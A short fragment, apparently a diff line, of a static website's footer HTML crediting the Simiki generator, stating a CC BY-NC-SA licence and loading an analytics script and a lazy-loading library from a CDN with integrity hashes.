+<a href=http://simiki.org/ target=_blank rel="noopener noreferrer">Simiki</a>. CC BY-NC-SA 4.0</span></div><script src=https://cdn.jsdelivr.net/npm/cfga@1.0.3/cfga.min.js integrity="sha256-TXHTTKAPRQ9mgacgN+couk0xnzQ6uOXTZ5ojH1q6GUk=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/vanilla-lazyload@12.3.0/dist/lazyload.min.js integrity="sha256-bojBIKfs4l2WDcJODncBIGEe5fhU7/sM3zRO5/f2nqE=" crossorigin=anonymous async></script>
